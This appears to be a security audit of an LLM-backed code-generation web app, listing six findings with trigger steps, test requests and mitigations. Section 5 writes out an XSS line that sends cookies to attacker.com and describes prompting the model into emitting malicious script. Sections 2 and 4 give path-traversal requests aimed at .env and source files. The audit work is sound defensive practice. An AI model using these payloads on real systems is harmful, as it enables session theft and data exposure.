# Updated Vulnerability List

## 1. **Unauthorized Access to Code Generation Endpoint**
**Vulnerability Name:** Unauthenticated Code Generation API Access
**Description:**
The `/generate-code` WebSocket endpoint in `routes/generate_code.py` allows unauthenticated access. An attacker can connect to this endpoint and trigger code generation requests without any authentication. The endpoint processes user-provided parameters (e.g., `params`), which could include arbitrary inputs to generate malicious code.

**Trigger Steps:**
1. An attacker connects to the WebSocket `/generate-code` endpoint.
2. They send a JSON payload with malicious parameters (e.g., `generatedCodeConfig`, `image` URLs, or `history`).
3. The backend processes the request, potentially generating harmful code (e.g., containing malicious scripts).

**Impact:**
Attackers can generate and retrieve malicious code for phishing, defacement, or RCE. High risk due to the uncontrolled generation of executable content.

**Rank:** Critical
**Currently Implemented Mitigations:** None.
**Missing Mitigations:**
- Implement authentication (JWT tokens/API keys) for WebSocket connections.
- Validate and sanitize all input parameters (e.g., stack type, image URLs).
- Rate-limit requests to prevent abuse.

**Preconditions:** None (publicly accessible endpoint).

**Source Code Analysis:**
- `routes/generate_code.py`: The WebSocket handler lacks authentication checks.
- Input parameters are parsed without validation.

**Security Test Case:**
1. Use `wscat` or WebSocket client to connect to `ws://localhost:7001/generate-code`.
2. Send a payload like:
```json
{
  "generatedCodeConfig": "html_tailwind",
  "image": "data:image/png;base64,...",
  "history": [
    "// Malicious prompt to generate code with eval() calls"
  ]
}
```
3. Verify if the server processes the request and returns generated code with potential vulnerabilities like `<script>...</script>` tags.

## 2. **Path Traversal in Evals File Handling**
**Vulnerability Name:** Path Traversal in `/evals` Endpoint
**Description:**
The `/evals` endpoint in `routes/evals.py` uses user-provided `folder` paths without validation. An attacker can manipulate the `folder` parameter to traverse to arbitrary directories and retrieve files (e.g., `.env`, `/etc/passwd`).

**Trigger Steps:**
1. Craft a request to `/evals` with a malicious `folder` path like `../../backend/`.
2. The endpoint reads files from the target directory and returns their contents.

**Impact:**
Exposure of sensitive files (API keys, config data) leading to further compromise. High impact due to potential data exfiltration.

**Rank:** High
**Currently Implemented Mitigations:** None.
**Missing Mitigations:**
- Validate the `folder` input to restrict paths to a sandbox directory.
- Use a whitelist of allowed directories instead of user input.

**Preconditions:** None (public endpoint).

**Source Code Analysis:**
- `routes/evals.py`: The `get_evals` function directly uses `folder` in `os.path.exists()` and `os.listdir()`.

**Security Test Case:**
1. Send GET request to `http://localhost:7001/evals?folder=../../backend`.
2. Check if the response includes files like `.env` or `config.py`.

---

## 3. **XSS via Mock Responses**
**Vulnerability Name:** Cross-Site Scripting (XSS) via Mock Code Generation
**Description:**
The `mock_llm.py` file contains hard-coded HTML mock responses. If an attacker can force the application to use MOCK mode (`MOCK=True`), they could trigger responses with malicious scripts. For example, the `NYTIMES_MOCK_CODE` includes unsanitized jQuery and external resources.

**Trigger Steps:**
1. Set `MOCK=True` via environment variable or code modification.
2. Trigger code generation, which returns mock responses with `<script>` tags.

**Impact:**
Stored XSS attacks if the malicious code is persisted in the frontend. High risk due to direct script execution.

**Rank:** High
**Currently Implemented Mitigations:** None.
**Missing Mitigations:**
- Sanitize all mock responses to prevent script injection.
- Restrict MOCK mode to testing environments only.

**Preconditions:** `MOCK` flag is enabled.

**Source Code Analysis:**
- `mock_llm.py` has mock HTML with unescaped scripts (e.g., `//` comments).

**Security Test Case:**
1. Set `MOCK=true` in `.env` and restart the backend.
2. Generate code and check responses for `<script>alert('XSS')</script>`.

## 4. **Insecure Direct Object References (IDOR) in Evals**
**Vulnerability Name:** IDOR in `/pairwise-evals` Endpoint
**Description:**
The `/pairwise-evals` endpoint in `routes/evals.py` allows comparing folders without access control. Attackers can specify arbitrary paths to sensitive directories (e.g., `../../`, `/home/`).

**Trigger Steps:**
1. Exploit the endpoint with `folder1=../../backend` and `folder2=../../frontend`.
2. Retrieve contents of critical directories.

**Impact:**
Exfiltration of source code or credentials. High impact due to widespread data exposure.

**Rank:** High
**Currently Implemented Mitigations:** None.
**Missing Mitigations:**
- Validate folder paths to restrict access to `/evals_data` only.

**Preconditions:** None (public endpoint).

**Source Code Analysis:**
- `routes/evals.py`: Directly uses user inputs for folder paths.

**Security Test Case:**
1. Send GET request to `http://localhost:7001/pairwise-evals?folder1=../../backend&folder2=../../frontend`.
2. Verify if backend files are returned.

## 5. **Improper Input Validation in Prompts**
**Vulnerability Name:** Code Injection via Prompt Engineering
**Description:**
Prompts sent to LLMs (e.g., in `prompts/__init__.py`) are not sanitized. Attackers can inject malicious prompts to generate harmful code (e.g., shell commands, SQLi).

**Trigger Steps:**
1. Craft a prompt like `Generate code for <script>document.location='https://attacker.com?cookie='+document.cookie;</script>`.
2. Trigger code generation, which returns the malicious script.

**Impact:**
Stored XSS or data exfiltration. High due to direct user interaction with generated code.

**Rank:** High
**Currently Implemented Mitigations:** None.
**Missing Mitigations:**
- Sanitize inputs to remove dangerous syntax.
- Use a content security policy (CSP) in generated code.

**Preconditions:** None (public endpoint).

**Source Code Analysis:**
- `routes/generate_code.py` processes user-provided prompts without checks.

**Security Test Case:**
1. Send a prompt containing malicious JavaScript.
2. Check if the response includes the injected script.

---

## 6. **Insecure Docker Configuration**
**Vulnerability Name:** Exposed Docker Ports with Default Config
**Description:**
The `docker-compose.yml` exposes ports 7001 (backend) and 5173 (frontend) without restriction. If deployed publicly, attackers can access unauthenticated endpoints.

**Trigger Steps:**
1. Deploy the service with exposed ports.
2. Attackers exploit unsecured endpoints to trigger vulnerabilities listed above.

**Impact:**
Enables exploitation of other vulnerabilities listed here. High due to broad exposure.

**Rank:** High
**Currently Implemented Mitigations:** None.
**Missing Mitigations:**
- Use `--network` to isolate services.
- Add authentication middleware (e.g., Nginx with auth).

**Preconditions:** Docker deployment exposes ports publicly.

**Source Code Analysis:**
- `docker-compose.yml` sets `ports` without restrictions.

**Security Test Case:**
1. Deploy via Docker with default `docker-compose up`.
2. Test unauthenticated access to `/generate-code` from external IP.

### Removed Vulnerability
**3. Insecure API Key Storage in Environment Variables**
Excluded because it is caused by developers not including `.env` in `.gitignore` (a documentation/code practice issue, per exclusion criteria).
